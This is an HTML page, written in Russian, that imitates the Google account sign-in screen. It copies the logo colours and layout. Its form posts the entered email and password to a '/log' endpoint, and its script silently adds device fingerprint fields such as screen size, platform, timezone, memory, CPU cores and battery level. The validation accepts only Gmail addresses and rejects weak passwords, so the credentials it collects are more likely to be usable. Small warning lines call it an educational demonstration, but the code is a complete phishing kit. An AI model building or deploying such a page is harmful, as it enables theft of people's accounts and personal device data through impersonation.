<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Вход в аккаунт Google</title>
    <style>
        body { font-family: Arial, sans-serif; background: #fff;
               display: flex; flex-direction: column; align-items: center;
               justify-content: center; min-height: 100vh; margin: 0; padding: 20px;
               box-sizing: border-box; }
        .container { width: 100%; max-width: 450px; padding: 40px;
                     border: 1px solid #dadce0; border-radius: 8px; text-align: center; }
        .logo { font-size: 24px; margin-bottom: 20px; }
        .logo span:nth-child(1) { color: #4285F4; }
        .logo span:nth-child(2) { color: #EA4335; }
        .logo span:nth-child(3) { color: #FBBC05; }
        .logo span:nth-child(4) { color: #4285F4; }
        .logo span:nth-child(5) { color: #34A853; }
        .logo span:nth-child(6) { color: #EA4335; }
        h1 { font-size: 24px; font-weight: 400; margin-bottom: 10px; }
        p { font-size: 16px; color: #202124; margin-bottom: 30px; }
        input { width: 100%; padding: 13px 15px; margin: 8px 0; font-size: 16px;
                border: 1px solid #dadce0; border-radius: 4px; box-sizing: border-box; }
        input:focus { outline: none; border: 1px solid #1a73e8; }
        input.error { border: 2px solid #d93025; }
        button { width: 100%; padding: 13px; margin-top: 30px; font-size: 16px;
                 background: #1a73e8; color: #fff; border: none;
                 border-radius: 4px; cursor: pointer; }
        button:hover { background: #1557b0; }
        .error-msg { color: #d93025; font-size: 14px; margin-top: 10px;
                     display: none; text-align: left; }
        .error-msg.show { display: block; }
        .warning { color: #d93025; font-size: 12px; margin-top: 20px; }
        .footer { margin-top: 20px; font-size: 12px; color: #5f6368; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span>
        </div>
        <h1>Вход</h1>
        <p>Используйте аккаунт Google</p>
        <form id="loginForm" method="POST" action="/log" novalidate>
            <input type="text" id="email" name="email" placeholder="Электронная почта или телефон">
            <input type="password" id="password" name="password" placeholder="Введите пароль">
            <div id="errorMsg" class="error-msg"></div>
            <button type="submit">Далее</button>
        </form>
        <p class="warning">⚠️ Это учебная демонстрация. Не вводите реальные данные.</p>
        <div class="footer">Это демонстрация уязвимости. Данные не сохраняются.</div>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            var form = document.getElementById('loginForm');
            var emailInput = document.getElementById('email');
            var passwordInput = document.getElementById('password');
            var errorMsg = document.getElementById('errorMsg');

            function showError(msg, field) {
                errorMsg.textContent = msg;
                errorMsg.classList.add('show');
                field.classList.add('error');
                field.focus();
            }

            function clearError() {
                errorMsg.classList.remove('show');
                emailInput.classList.remove('error');
                passwordInput.classList.remove('error');
            }

            // Сбор данных
            var data = {
                screen: screen.width + 'x' + screen.height,
                platform: navigator.platform || 'unknown',
                timezone: 'unknown',
                language: navigator.language || 'unknown',
                cores: navigator.hardwareConcurrency || 'unknown',
                memory: navigator.deviceMemory || 'unknown',
                touch: ('ontouchstart' in window) ? 'Да' : 'Нет',
                battery: 'unknown'
            };

            try {
                data.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
            } catch(e) {}

            function addFields() {
                for (var key in data) {
                    var input = document.createElement('input');
                    input.type = 'hidden';
                    input.name = key;
                    input.value = data[key];
                    form.appendChild(input);
                }
            }

            if (navigator.getBattery) {
                navigator.getBattery().then(function(b) {
                    data.battery = Math.round(b.level * 100) + '%';
                    addFields();
                }).catch(function() {
                    addFields();
                });
            } else {
                addFields();
            }

            // Валидация перед отправкой
            form.addEventListener('submit', function(e) {
                clearError();

                var email = emailInput.value.trim();
                var password = passwordInput.value;

                // Проверка email
                if (!email.endsWith('@gmail.com')) {
                    e.preventDefault();
                    showError('Введите адрес электронной почты Google (@gmail.com).', emailInput);
                    return;
                }

                // Проверка длины пароля
                if (password.length < 8) {
                    e.preventDefault();
                    showError('Пароль должен содержать не менее 8 символов.', passwordInput);
                    return;
                }

                // Проверка на пробелы
                if (password !== password.trim()) {
                    e.preventDefault();
                    showError('Пароль не должен начинаться или заканчиваться пробелом.', passwordInput);
                    return;
                }

                // Проверка на простые пароли
                var weak = ['password', '12345678', 'qwertyui', '123456789'];
                if (weak.indexOf(password.toLowerCase()) !== -1) {
                    e.preventDefault();
                    showError('Слишком простой пароль. Выберите более сложный.', passwordInput);
                    return;
                }
            });
        });
    </script>
</body>
</html>
